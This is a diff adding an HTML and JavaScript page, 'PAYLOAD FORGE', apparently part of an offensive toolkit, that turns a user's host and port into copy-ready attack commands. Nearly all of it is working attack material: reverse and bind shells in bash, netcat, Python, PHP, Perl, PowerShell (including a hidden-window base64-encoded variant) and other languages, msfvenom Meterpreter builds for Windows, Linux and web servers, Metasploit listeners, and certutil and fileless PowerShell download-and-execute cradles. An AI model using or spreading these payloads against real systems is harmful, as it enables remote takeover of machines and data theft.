@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>MOTHER — PAYLOAD FORGE</title>
+<link rel="stylesheet" href="mother.css">
+<style>
+  /* ═══════════════════════════════════════════════════════════════
+     PAYLOAD FORGE — SYS.06. Reverse/bind shell + msfvenom generator.
+     Enter LHOST/LPORT once → every payload regenerates live. The
+     PowerShell base64 shell is really UTF-16LE-encoded in JS.
+     Module-specific CSS only; theme lives in mother.css.
+     ═══════════════════════════════════════════════════════════════ */
+  .ctrlbar {
+    display:flex; align-items:flex-end; gap:12px; flex-wrap:wrap;
+    padding:8px 14px; border-bottom:1px solid var(--border);
+    background:linear-gradient(180deg,rgba(51,255,51,0.04),transparent);
+  }
+  .ctrlbar .ph-lhost { min-width:140px; }
+  .ctrlbar .ph-lport { min-width:90px; }
+  .ctrlbar .ph-shell { min-width:130px; }
+  .ctrlbar input, .ctrlbar select { width:100%; }
+  .listener-hint {
+    flex:1 1 320px; display:flex; flex-direction:column; gap:3px;
+    border:1px solid var(--border-dim); padding:6px 9px; background:var(--bg-input);
+  }
+  .listener-hint .lh-label { font-size:8px; letter-spacing:0.18em; color:var(--phos-dim); text-transform:uppercase; }
+  .listener-hint code { font-size:10px; color:var(--holo); word-break:break-all; }
+  .listener-hint .lh-row { display:flex; gap:8px; align-items:center; }
+  .listener-hint .lh-copy { margin-left:auto; }
+
+  .split { display:grid; grid-template-columns:210px 1fr; min-height:0; height:100%; }
+  .cats { display:flex; flex-direction:column; padding:6px 0; }
+
+  .main-head {
+    display:flex; align-items:center; justify-content:space-between; gap:10px;
+    padding:10px 16px; border-bottom:1px solid var(--border-dim);
+    position:sticky; top:0; background:var(--bg-deep); z-index:5;
+  }
+  .main-head .h-title { font-size:11px; letter-spacing:0.2em; color:var(--phos-br); text-shadow:var(--glow); }
+  .main-head .h-sub { font-size:9px; letter-spacing:0.14em; color:var(--phos-dim); }
+  .cards-wrap { padding:12px 16px 40px; }
+
+  .card { display:grid; gap:8px; }
+  .cmd-top { display:flex; align-items:center; justify-content:space-between; gap:10px; }
+  .cmd-name { font-size:11px; letter-spacing:0.12em; color:var(--phos-br); }
+  .code { line-height:1.5; }
+  .subbed {
+    color:var(--holo); background:rgba(0,200,255,0.10);
+    padding:0 3px; border-radius:1px; text-shadow:0 0 5px rgba(0,200,255,0.5);
+  }
+  .cmd-desc { font-size:10px; color:var(--phos-dim); letter-spacing:0.03em; line-height:1.45; }
+  .cmd-tags { display:flex; flex-wrap:wrap; gap:0; }
+  .copy-fb { color:var(--ok) !important; border-color:var(--ok) !important; }
+  .pref-note { font-size:9px; color:var(--amber); letter-spacing:0.1em; }
+</style>
+</head>
+<body>
+  <header class="m-header">
+    <div class="m-brand">PAYLOAD FORGE<small>MOTHER · SYS.06 · SHELL GENERATOR</small></div>
+    <div class="m-stats">
+      <div class="m-stat">Payloads<b id="s-count">0</b></div>
+      <div class="m-stat">LHost<b id="s-lhost" class="holo">—</b></div>
+      <div class="m-stat">LPort<b id="s-lport" class="holo">—</b></div>
+    </div>
+    <div class="m-haz"></div>
+    <div class="m-stat" style="text-align:right">Shell Pref<b id="s-shell" class="amber">BASH</b></div>
+  </header>
+
+  <div class="m-body" style="grid-template-rows:auto 1fr; display:grid;">
+    <div class="ctrlbar">
+      <div class="field ph-lhost"><label>LHost</label><input id="p-LHOST" placeholder="10.10.14.7" autocomplete="off" spellcheck="false"></div>
+      <div class="field ph-lport"><label>LPort</label><input id="p-LPORT" placeholder="4444" autocomplete="off" spellcheck="false"></div>
+      <div class="field ph-shell"><label>Shell Pref</label>
+        <select id="p-SHELL">
+          <option value="bash">bash</option>
+          <option value="sh">sh</option>
+          <option value="powershell">powershell</option>
+        </select>
+      </div>
+      <div class="listener-hint">
+        <div class="lh-label">◤ Matching Listener · LPORT <span id="lh-port">4444</span> ◥</div>
+        <div class="lh-row"><code id="lh-nc"></code><button class="copy-btn lh-copy" data-lh="nc">⧉</button></div>
+        <div class="lh-row"><code id="lh-msf"></code><button class="copy-btn lh-copy" data-lh="msf">⧉</button></div>
+      </div>
+    </div>
+
+    <div class="split">
+      <nav class="pane pane--nav">
+        <div class="cats navlist" id="cats"></div>
+      </nav>
+      <section class="pane">
+        <div class="main-head">
+          <div class="h-title" id="h-title">REVERSE SHELLS</div>
+          <div class="h-sub" id="h-sub">0 payloads</div>
+        </div>
+        <div class="cards-wrap" id="cards"></div>
+      </section>
+    </div>
+  </div>
+
+  <script>
+  'use strict';
+  const $ = id => document.getElementById(id);
+  const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  const KEY = 'mother.payloadforge.v1';
+  const TOKRE = /<(LHOST|LPORT)>/g;
+
+  /* ── State + persistence ─────────────────────────────────────── */
+  const DEFAULTS = { LHOST:'10.10.14.7', LPORT:'4444', SHELL:'bash' };
+  let cfg = load();
+  let curCat = 'REVERSE SHELLS';
+
+  function load() {
+    try { const s = JSON.parse(localStorage.getItem(KEY)); if (s && typeof s === 'object') return { ...DEFAULTS, ...s }; }
+    catch (e) {}
+    return { ...DEFAULTS };
+  }
+  function save() { try { localStorage.setItem(KEY, JSON.stringify(cfg)); } catch (e) {} }
+  const L = () => (cfg.LHOST || '').trim() || '<LHOST>';
+  const P = () => (cfg.LPORT || '').trim() || '<LPORT>';
+
+  /* ── PowerShell base64 (real UTF-16LE encoding) ──────────────── */
+  function psReverseSource(l, p) {
+    return "$client = New-Object System.Net.Sockets.TCPClient('" + l + "'," + p + ");" +
+      "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};" +
+      "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;" +
+      "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);" +
+      "$sendback = (iex $data 2>&1 | Out-String );" +
+      "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';" +
+      "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" +
+      "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
+  }
+  function utf16leBase64(str) {
+    let bin = '';
+    for (let i = 0; i < str.length; i++) {
+      const c = str.charCodeAt(i);
+      bin += String.fromCharCode(c & 0xff, (c >> 8) & 0xff);
+    }
+    return btoa(bin);
+  }
+  function psEncoded(l, p) { return 'powershell -nop -w hidden -e ' + utf16leBase64(psReverseSource(l, p)); }
+
+  /* ── Payload library ─────────────────────────────────────────────
+     Each entry: { cat, name, gen(l,p)->string, desc, tags, shell? }.
+     Command bodies use backtick literals (no quote escaping); every
+     backslash is doubled so \\; → \; at runtime.                       */
+  const P_LIST = [
+    /* ─────────── REVERSE SHELLS ─────────── */
+    { cat:'REVERSE SHELLS', name:'bash -i', shell:'bash',
+      gen:(l,p)=>`bash -i >& /dev/tcp/${l}/${p} 0>&1`,
+      desc:'Classic interactive bash reverse shell over /dev/tcp', tags:['bash','linux'] },
+    { cat:'REVERSE SHELLS', name:'bash 196/tcp', shell:'bash',
+      gen:(l,p)=>`0<&196;exec 196<>/dev/tcp/${l}/${p}; sh <&196 >&196 2>&196`,
+      desc:'Bash reverse shell via a spare file descriptor (fd 196)', tags:['bash','fd']},
+    { cat:'REVERSE SHELLS', name:'sh -i', shell:'sh',
+      gen:(l,p)=>`/bin/sh -i >& /dev/tcp/${l}/${p} 0>&1`,
+      desc:'POSIX sh reverse shell where bash is unavailable', tags:['sh','linux'] },
+    { cat:'REVERSE SHELLS', name:'nc mkfifo (no -e)', shell:'sh',
+      gen:(l,p)=>`rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${l} ${p} >/tmp/f`,
+      desc:'Portable netcat reverse shell for builds without -e/GAPING', tags:['netcat','mkfifo'] },
+    { cat:'REVERSE SHELLS', name:'nc -e', shell:'sh',
+      gen:(l,p)=>`nc -e /bin/sh ${l} ${p}`,
+      desc:'Netcat reverse shell (requires -e / traditional build)', tags:['netcat'] },
+    { cat:'REVERSE SHELLS', name:'ncat -e', shell:'sh',
+      gen:(l,p)=>`ncat ${l} ${p} -e /bin/bash`,
+      desc:'Nmap ncat reverse shell with command execution', tags:['ncat'] },
+    { cat:'REVERSE SHELLS', name:'ncat --ssl', shell:'sh',
+      gen:(l,p)=>`ncat --ssl ${l} ${p} -e /bin/bash`,
+      desc:'TLS-wrapped ncat reverse shell (pair with ncat --ssl -lvnp)', tags:['ncat','ssl'] },
+    { cat:'REVERSE SHELLS', name:'python3', shell:'sh',
+      gen:(l,p)=>`python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${l}",${p}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`,
+      desc:'Python3 reverse shell, spawns a PTY straight away', tags:['python','pty'] },
+    { cat:'REVERSE SHELLS', name:'python (2.x)', shell:'sh',
+      gen:(l,p)=>`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${l}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
+      desc:'Python2 reverse shell (subprocess variant)', tags:['python'] },
+    { cat:'REVERSE SHELLS', name:'php', shell:'sh',
+      gen:(l,p)=>`php -r '$sock=fsockopen("${l}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`,
+      desc:'PHP reverse shell via fsockopen + exec', tags:['php'] },
+    { cat:'REVERSE SHELLS', name:'php proc_open', shell:'sh',
+      gen:(l,p)=>`php -r '$sock=fsockopen("${l}",${p});$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'`,
+      desc:'PHP reverse shell using proc_open (works when exec is filtered)', tags:['php'] },
+    { cat:'REVERSE SHELLS', name:'perl', shell:'sh',
+      gen:(l,p)=>`perl -e 'use Socket;$i="${l}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
+      desc:'Perl reverse shell (present on most Linux hosts)', tags:['perl'] },
+    { cat:'REVERSE SHELLS', name:'ruby', shell:'sh',
+      gen:(l,p)=>`ruby -rsocket -e'f=TCPSocket.open("${l}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
+      desc:'Ruby reverse shell one-liner', tags:['ruby'] },
+    { cat:'REVERSE SHELLS', name:'powershell (plain)', shell:'powershell',
+      gen:(l,p)=>`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${l}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
+      desc:'Full PowerShell TCP-client reverse shell, cleartext', tags:['powershell','windows'] },
+    { cat:'REVERSE SHELLS', name:'powershell -e (base64)', shell:'powershell', computed:true,
+      gen:(l,p)=>psEncoded(l,p),
+      desc:'Real UTF-16LE base64-encoded PowerShell reverse shell (regenerated live)', tags:['powershell','base64','encoded'] },
+    { cat:'REVERSE SHELLS', name:'socat', shell:'sh',
+      gen:(l,p)=>`socat TCP:${l}:${p} EXEC:'bash -li',pty,stderr,setsid,sigint,sane`,
+      desc:'socat reverse shell delivering a fully interactive TTY', tags:['socat','pty'] },
+    { cat:'REVERSE SHELLS', name:'awk', shell:'sh',
+      gen:(l,p)=>`awk 'BEGIN {s = "/inet/tcp/0/${l}/${p}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
+      desc:'GNU awk reverse shell via the /inet special file', tags:['awk'] },
+    { cat:'REVERSE SHELLS', name:'node.js', shell:'sh',
+      gen:(l,p)=>`node -e 'const c=require("child_process"),n=require("net"),s=new n.Socket();s.connect(${p},"${l}",()=>{const sh=c.spawn("/bin/sh",[]);s.pipe(sh.stdin);sh.stdout.pipe(s);sh.stderr.pipe(s);});'`,
+      desc:'Node.js reverse shell piping a spawned /bin/sh', tags:['node','javascript'] },
+    { cat:'REVERSE SHELLS', name:'telnet', shell:'sh',
+      gen:(l,p)=>`TF=$(mktemp -u);mkfifo $TF && telnet ${l} ${p} 0<$TF | /bin/sh 1>$TF`,
+      desc:'Telnet + named pipe reverse shell for minimal hosts', tags:['telnet','mkfifo'] },
+    { cat:'REVERSE SHELLS', name:'lua', shell:'sh',
+      gen:(l,p)=>`lua -e "require('socket');require('os');t=socket.tcp();t:connect('${l}','${p}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
+      desc:'Lua reverse shell using luasocket', tags:['lua'] },
+    { cat:'REVERSE SHELLS', name:'golang', shell:'sh',
+      gen:(l,p)=>`echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${l}:${p}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go`,
+      desc:'Go reverse shell compiled and run on the fly', tags:['golang'] },
+
+    /* ─────────── BIND SHELLS ─────────── */
+    { cat:'BIND SHELLS', name:'nc -e',
+      gen:(l,p)=>`nc -lvnp ${p} -e /bin/bash`,
+      desc:'Netcat bind shell — victim listens, you connect in', tags:['netcat','bind'] },
+    { cat:'BIND SHELLS', name:'nc mkfifo',
+      gen:(l,p)=>`rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp ${p} >/tmp/f`,
+      desc:'Portable netcat bind shell without -e', tags:['netcat','mkfifo'] },
+    { cat:'BIND SHELLS', name:'python',
+      gen:(l,p)=>`python3 -c 'import socket,os,pty;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",${p}));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`,
+      desc:'Python3 bind shell listening on all interfaces', tags:['python','bind'] },
+    { cat:'BIND SHELLS', name:'socat',
+      gen:(l,p)=>`socat TCP-LISTEN:${p},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane`,
+      desc:'socat bind shell serving a full interactive TTY', tags:['socat','pty'] },
+    { cat:'BIND SHELLS', name:'powershell (powercat)',
+      gen:(l,p)=>`powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://${l}/powercat.ps1');powercat -l -p ${p} -e cmd.exe"`,
+      desc:'PowerShell bind shell via powercat (import then listen)', tags:['powershell','powercat','bind'] },
+
+    /* ─────────── MSFVENOM ─────────── */
+    { cat:'MSFVENOM', name:'windows x64 meterpreter (exe)',
+      gen:(l,p)=>`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${l} LPORT=${p} -f exe -o shell.exe`,
+      desc:'Staged x64 Meterpreter Windows executable', tags:['windows','meterpreter','exe'] },
+    { cat:'MSFVENOM', name:'windows shell_reverse_tcp (exe)',
+      gen:(l,p)=>`msfvenom -p windows/x64/shell_reverse_tcp LHOST=${l} LPORT=${p} -f exe -o shell.exe`,
+      desc:'Stageless plain reverse shell exe (catch with nc)', tags:['windows','stageless'] },
+    { cat:'MSFVENOM', name:'windows x64 meterpreter (dll)',
+      gen:(l,p)=>`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${l} LPORT=${p} -f dll -o shell.dll`,
+      desc:'Meterpreter payload as a DLL for hijack/sideload', tags:['windows','dll'] },
+    { cat:'MSFVENOM', name:'linux x64 meterpreter (elf)',
+      gen:(l,p)=>`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${l} LPORT=${p} -f elf -o shell.elf`,
+      desc:'Staged x64 Meterpreter Linux ELF binary', tags:['linux','meterpreter','elf'] },
+    { cat:'MSFVENOM', name:'php',
+      gen:(l,p)=>`msfvenom -p php/meterpreter_reverse_tcp LHOST=${l} LPORT=${p} -f raw -o shell.php`,
+      desc:'PHP Meterpreter payload (prepend <?php, strip trailing)', tags:['php','web'] },
+    { cat:'MSFVENOM', name:'asp',
+      gen:(l,p)=>`msfvenom -p windows/shell_reverse_tcp LHOST=${l} LPORT=${p} -f asp -o shell.asp`,
+      desc:'Classic ASP reverse shell for IIS upload', tags:['asp','windows','web'] },
+    { cat:'MSFVENOM', name:'jsp',
+      gen:(l,p)=>`msfvenom -p java/jsp_shell_reverse_tcp LHOST=${l} LPORT=${p} -f raw -o shell.jsp`,
+      desc:'JSP reverse shell for Tomcat / Java web apps', tags:['jsp','java','web'] },
+    { cat:'MSFVENOM', name:'war',
+      gen:(l,p)=>`msfvenom -p java/jsp_shell_reverse_tcp LHOST=${l} LPORT=${p} -f war -o shell.war`,
+      desc:'Deployable WAR reverse shell for Tomcat manager', tags:['war','tomcat','web'] },
+    { cat:'MSFVENOM', name:'python',
+      gen:(l,p)=>`msfvenom -p cmd/unix/reverse_python LHOST=${l} LPORT=${p} -f raw`,
+      desc:'One-line Python command payload (unix)', tags:['python','cmd'] },
+
+    /* ─────────── LISTENERS ─────────── */
+    { cat:'LISTENERS', name:'netcat',
+      gen:(l,p)=>`nc -lvnp ${p}`,
+      desc:'Bare netcat listener — catches most raw reverse shells', tags:['netcat'] },
+    { cat:'LISTENERS', name:'rlwrap netcat',
+      gen:(l,p)=>`rlwrap nc -lvnp ${p}`,
+      desc:'netcat wrapped in rlwrap for arrow-key history/editing', tags:['netcat','rlwrap'] },
+    { cat:'LISTENERS', name:'socat (upgraded TTY)',
+      gen:(l,p)=>`socat file:` + "`tty`" + `,raw,echo=0 TCP-LISTEN:${p}`,
+      desc:'socat listener that grants a fully interactive TTY on connect', tags:['socat','pty'] },
+    { cat:'LISTENERS', name:'ncat --ssl',
+      gen:(l,p)=>`ncat --ssl -lvnp ${p}`,
+      desc:'TLS listener to pair with an ncat --ssl reverse shell', tags:['ncat','ssl'] },
+    { cat:'LISTENERS', name:'msfconsole multi/handler',
+      gen:(l,p)=>`msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ${l}; set LPORT ${p}; exploit -j"`,
+      desc:'Metasploit handler for staged Meterpreter payloads', tags:['metasploit','handler'] },
+
+    /* ─────────── TTY UPGRADE ─────────── */
+    { cat:'TTY UPGRADE', name:'python pty spawn',
+      gen:(l,p)=>`python3 -c 'import pty; pty.spawn("/bin/bash")'`,
+      desc:'Step 1 — upgrade a dumb shell to a pseudo-terminal', tags:['tty','python'] },
+    { cat:'TTY UPGRADE', name:'stty raw -echo (full upgrade)',
+      gen:(l,p)=>`# after pty spawn: press Ctrl+Z, then on your box:\nstty raw -echo; fg\n# back in the shell:\nexport TERM=xterm; stty rows 38 columns 116`,
+      desc:'Step 2 — background, set raw mode, foreground; fix TERM + size', tags:['tty','stty'] },
+    { cat:'TTY UPGRADE', name:'script /dev/null',
+      gen:(l,p)=>`script -qc /bin/bash /dev/null`,
+      desc:'Alternative PTY upgrade when python is missing', tags:['tty','script'] },
+    { cat:'TTY UPGRADE', name:'socat both-sides TTY',
+      gen:(l,p)=>`# victim:\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${l}:${p}\n# attacker:\nsocat file:` + "`tty`" + `,raw,echo=0 tcp-listen:${p}`,
+      desc:'Perfect TTY out of the box using socat on both ends', tags:['tty','socat'] },
+
+    /* ─────────── ENCODERS / HELPERS ─────────── */
+    { cat:'ENCODERS/HELPERS', name:'python http server',
+      gen:(l,p)=>`python3 -m http.server ${p}`,
+      desc:'Serve the current directory to transfer tools to a target', tags:['transfer','http'] },
+    { cat:'ENCODERS/HELPERS', name:'impacket smbserver',
+      gen:(l,p)=>`impacket-smbserver share . -smb2support`,
+      desc:'Stand up an SMB share for Windows file transfer', tags:['transfer','smb'] },
+    { cat:'ENCODERS/HELPERS', name:'wget download (linux)',
+      gen:(l,p)=>`wget http://${l}:${p}/tool -O /tmp/tool && chmod +x /tmp/tool`,
+      desc:'Pull a file onto a Linux target and make it executable', tags:['transfer','wget'] },
+    { cat:'ENCODERS/HELPERS', name:'certutil download (windows)',
+      gen:(l,p)=>`certutil -urlcache -f http://${l}:${p}/nc.exe C:\\Windows\\Temp\\nc.exe`,
+      desc:'LOLBAS file download on Windows via certutil', tags:['transfer','windows'] },
+    { cat:'ENCODERS/HELPERS', name:'powershell IEX download-cradle',
+      gen:(l,p)=>`powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://${l}:${p}/run.ps1')"`,
+      desc:'Fileless PowerShell download-and-execute cradle', tags:['windows','powershell'] },
+    { cat:'ENCODERS/HELPERS', name:'base64 encode file',
+      gen:(l,p)=>`base64 -w0 shell.exe`,
+      desc:'Base64 a binary for copy/paste transfer over a shell', tags:['encode','base64'] },
+    { cat:'ENCODERS/HELPERS', name:'powershell base64 wrapper',
+      gen:(l,p)=>`# encode any command to -EncodedCommand (UTF-16LE base64):\ncmd='whoami'; python3 -c "import base64,sys;print(base64.b64encode(sys.argv[1].encode('utf-16-le')).decode())" "$cmd"`,
+      desc:'Build a -e / -EncodedCommand blob for any PowerShell one-liner', tags:['encode','powershell'] },
+  ];
+
+  const CATS = ['REVERSE SHELLS','BIND SHELLS','MSFVENOM','LISTENERS','TTY UPGRADE','ENCODERS/HELPERS'];
+
+  /* ── Rendering ───────────────────────────────────────────────── */
+  function highlight(str) {
+    // escape, then wrap literal LHOST / LPORT occurrences in holo spans
+    const l = (cfg.LHOST || '').trim(), p = (cfg.LPORT || '').trim();
+    let html = esc(str);
+    [l, p].forEach(v => {
+      if (!v) return;
+      const re = new RegExp('(' + v.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')', 'g');
+      html = html.replace(re, '<span class="subbed">$1</span>');
+    });
+    // also mark unresolved <LHOST>/<LPORT> tokens (when a field is blank)
+    html = html.replace(/&lt;(LHOST|LPORT)&gt;/g, '<span class="subbed">&lt;$1&gt;</span>');
+    return html;
+  }
+
+  function orderedFor(cat) {
+    let rows = P_LIST.filter(x => x.cat === cat);
+    if (cat === 'REVERSE SHELLS') {
+      const pref = cfg.SHELL;
+      rows = rows.slice().sort((a, b) => (b.shell === pref) - (a.shell === pref));
+    }
+    return rows;
+  }
+
+  function renderCats() {
+    const el = $('cats');
+    el.innerHTML = CATS.map(c => {
+      const n = P_LIST.filter(x => x.cat === c).length;
+      const active = c === curCat ? ' navitem--active' : '';
+      return `<button class="navitem${active}" data-cat="${esc(c)}">${esc(c)}<span class="count">${n}</span></button>`;
+    }).join('');
+    el.querySelectorAll('.navitem').forEach(b =>
+      b.addEventListener('click', () => { curCat = b.dataset.cat; renderCats(); renderCards(); }));
+  }
+
+  function renderCards() {
+    const l = L(), p = P(), rows = orderedFor(curCat);
+    $('h-title').textContent = curCat;
+    $('h-sub').textContent = rows.length + ' payloads';
+    $('cards').innerHTML = rows.map((x) => {
+      const idx = P_LIST.indexOf(x);
+      const cmd = x.gen(l, p);
+      const pref = (curCat === 'REVERSE SHELLS' && x.shell === cfg.SHELL)
+        ? '<span class="tag tag--amber">PREFERRED</span>' : '';
+      const enc = x.computed ? '<span class="tag tag--holo">LIVE-ENCODED</span>' : '';
+      const tags = x.tags.map(t => `<span class="tag">${esc(t)}</span>`).join('');
+      return `<div class="card brackets">
+        <div class="cmd-top">
+          <span class="cmd-name">${esc(x.name)}</span>
+          <button class="copy-btn" data-i="${idx}">⧉ COPY</button>
+        </div>
+        <div class="code">${highlight(cmd)}</div>
+        <div class="cmd-desc">${esc(x.desc)}</div>
+        <div class="cmd-tags">${pref}${enc}${tags}</div>
+      </div>`;
+    }).join('');
+  }
+
+  function ncListener() { return 'nc -lvnp ' + P(); }
+  function msfListener() {
+    return 'msfconsole -q -x "use multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST ' +
+      L() + '; set LPORT ' + P() + '; exploit -j"';
+  }
+  function renderListenerHint() {
+    $('lh-port').textContent = P();
+    $('lh-nc').innerHTML = highlight(ncListener());
+    $('lh-msf').innerHTML = highlight(msfListener());
+  }
+
+  function updateStats() {
+    $('s-count').textContent = P_LIST.length;
+    $('s-lhost').textContent = (cfg.LHOST || '').trim() || '—';
+    $('s-lport').textContent = (cfg.LPORT || '').trim() || '—';
+    $('s-shell').textContent = (cfg.SHELL || 'bash').toUpperCase();
+  }
+
+  /* ── Copy handling ───────────────────────────────────────────── */
+  function copyText(text) {
+    if (navigator.clipboard && navigator.clipboard.writeText) return navigator.clipboard.writeText(text);
+    return new Promise(res => {
+      const ta = document.createElement('textarea');
+      ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
+      document.body.appendChild(ta); ta.select();
+      try { document.execCommand('copy'); } catch (e) {}
+      document.body.removeChild(ta); res();
+    });
+  }
+  function flashBtn(btn, codeEl) {
+    if (codeEl) { codeEl.classList.remove('flash'); void codeEl.offsetWidth; codeEl.classList.add('flash'); }
+    const prev = btn.textContent; btn.textContent = '✔'; btn.classList.add('copy-fb');
+    setTimeout(() => { btn.textContent = prev; btn.classList.remove('copy-fb'); }, 900);
+  }
+  $('cards').addEventListener('click', e => {
+    const btn = e.target.closest('.copy-btn'); if (!btn) return;
+    const x = P_LIST[+btn.dataset.i]; if (!x) return;
+    copyText(x.gen(L(), P())).then(() => {
+      const card = btn.closest('.card');
+      flashBtn(btn, card && card.querySelector('.code'));
+      btn.textContent = '✔ COPIED';
+      setTimeout(() => { btn.textContent = '⧉ COPY'; }, 900);
+    });
+  });
+  document.querySelector('.listener-hint').addEventListener('click', e => {
+    const btn = e.target.closest('.lh-copy'); if (!btn) return;
+    const text = btn.dataset.lh === 'nc' ? ncListener() : msfListener();
+    copyText(text).then(() => flashBtn(btn, btn.parentElement.querySelector('code')));
+  });
+
+  /* ── Inputs ──────────────────────────────────────────────────── */
+  $('p-LHOST').value = cfg.LHOST; $('p-LPORT').value = cfg.LPORT; $('p-SHELL').value = cfg.SHELL;
+  function refreshAll() { updateStats(); renderListenerHint(); renderCards(); }
+  $('p-LHOST').addEventListener('input', () => { cfg.LHOST = $('p-LHOST').value; save(); refreshAll(); });
+  $('p-LPORT').addEventListener('input', () => { cfg.LPORT = $('p-LPORT').value; save(); refreshAll(); });
+  $('p-SHELL').addEventListener('change', () => { cfg.SHELL = $('p-SHELL').value; save(); updateStats(); renderCats(); renderCards(); });
+
+  /* ── Boot ────────────────────────────────────────────────────── */
+  updateStats(); renderCats(); renderListenerHint(); renderCards();
+  </script>
+</body>
+</html>
